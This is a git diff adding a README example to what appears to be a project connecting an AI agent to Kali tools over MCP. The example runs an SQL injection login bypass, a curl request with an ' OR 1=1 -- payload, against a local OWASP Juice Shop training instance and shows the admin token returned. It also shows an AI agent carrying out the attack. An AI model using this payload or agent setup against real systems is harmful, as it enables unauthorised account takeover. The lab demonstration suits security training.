@@ -154,3 +154,66 @@ VS Code + GitHub Copilot
           ├── ffuf_scan
           └── etc.
 ```
+
+
+
+# Example: OWASP Juice Shop — SQL Injection Validation
+
+This example uses a local OWASP Juice Shop instance to demonstrate the complete MCP → Kali → tool output → AI response workflow.
+
+
+![MCP architecture and AI agent](images/01-mcp-ai-agent.png)
+
+
+
+
+### 1. Initial Attempt
+
+The first attempt tried several SQL injection payloads in a shell `for` loop.
+
+The command failed because of incorrect shell quoting/escaping:
+
+```text
+status: error
+exit_code: 2
+
+/bin/sh: 6: Syntax error: Unterminated quoted string
+```
+
+This demonstrates why careful shell quoting is important when JSON payloads contain characters such as `'`, `"`, and `--`.
+
+![MCP tool input and shell quoting error](images/02-mcp-tool-input.png)
+
+
+### 2. Successful Validation
+
+A single payload was then sent using `curl` with the JSON request body properly escaped:
+
+```bash
+curl -sS \
+  -D /tmp/juice_sql_login_headers.txt \
+  -o /tmp/juice_sql_login_body.txt \
+  -H 'Content-Type: application/json' \
+  --data '{"email":"admin@juice-sh.op'\'' OR 1=1 -- ","password":"x"}' \
+  http://127.0.0.1:3000/rest/user/login
+```
+
+The request completed successfully:
+
+```text
+HTTP/1.1 200 OK
+authentication.token = present
+umail = admin@juice-sh.op
+bid = 1
+```
+
+The response contained an authentication object and JWT associated with the Juice Shop administrator account.
+
+![Successful SQL injection result](images/03-sqli-success.png)
+
+
+### 3. AI Agent Interpretation
+
+he AI agent receives summarizes the successful authentication response for the user.
+
+![AI explanation of the result](images/04-ai-explanation.png)
